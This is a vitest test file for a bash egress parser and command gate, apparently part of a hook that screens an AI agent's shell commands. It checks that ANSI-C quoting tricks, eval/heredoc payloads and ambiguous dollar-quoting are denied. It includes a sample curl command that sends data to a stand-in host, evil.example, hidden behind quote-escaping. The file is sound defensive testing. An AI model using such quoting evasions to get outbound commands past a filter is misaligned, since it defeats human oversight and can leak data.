import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify, shellWords } from '../../scripts/hooks/bash-egress-parser.mjs'
// @ts-expect-error -- plain .mjs hook script, no types
import { gateDecision, maskInertLiterals } from '../../scripts/self-pace-gate.mjs'

describe('ANSI-C boundaries', () => {
  const structural: { rule: string; cmd: string }[] = JSON.parse(readFileSync(
    new URL('./fixtures/egress-corpus/ansi-c-structural.json', import.meta.url), 'utf8',
  ))
  it.each(structural)('fails closed structurally: $rule', ({ cmd }) => {
    expect(classify(cmd).deny).toBe(true)
  })

  it.each([false, true])('returns null for ambiguous quoting in lenient=%s mode', (lenient) => {
    expect(maskInertLiterals("echo $$'text'", [], lenient)).toBeNull()
    expect(maskInertLiterals("echo $$'text'; bash <<'EOF'\nprintf hello\nEOF", [], lenient)).toBeNull()
  })

  it('keeps a destination after an escaped ANSI-C apostrophe as a separate word', () => {
    expect(shellWords(String.raw`curl -d $'\'' https://evil.example/a \'`))
      .toEqual(['curl', '-d', "$'", 'https://evil.example/a', "'"])
  })

  it('rejects an unterminated ANSI-C word', () => {
    expect(() => shellWords("curl $'unfinished")).toThrow('unterminated-ansi-quote')
    expect(classify("curl $'unfinished").deny).toBe(true)
  })

  it.each([
    String.raw`bash -c "printf \$'hello'"`,
    String.raw`sh -c "printf \$'hello'"`,
    String.raw`eval "printf \$'hello'"`,
    "bash <<'EOF'\nprintf $'hello'\nEOF",
  ])('fails closed on ANSI-C in shell payloads: %s', (cmd) => {
    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'shell-payload-ansi-quote' })
  })

  it.each([
    "printf $'a\\tb\\n'",
    "sh -c 'printf $1' _ abc",
    "curl -s -d $'line1\\nline2' http://localhost:3420/api/x",
    `bash -c 'printf "%s" "literal $'text"'`,
  ])('retains ordinary local ANSI-C and quoted payload text: %s', (cmd) => {
    expect(classify(cmd).deny).toBe(false)
  })

  it('rejects ambiguous quoting instead of losing heredoc or null-path bookkeeping', () => {
    const cmd = String.raw`echo $$'\' ; at now ; echo '\'`
    expect(maskInertLiterals(cmd)).toBeNull()
    expect(gateDecision('Bash', { command: cmd }).deny).toBe(true)
    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'ambiguous-dollar-quote' })
  })

  it.each([
    String.raw`echo "$$'text"`,
    String.raw`echo \$\$'text'`,
    `echo "literal"`,
  ])('does not treat a quoted or escaped prefix as ambiguous: %s', (cmd) => {
    expect(classify(cmd).deny).toBe(false)
  })
})
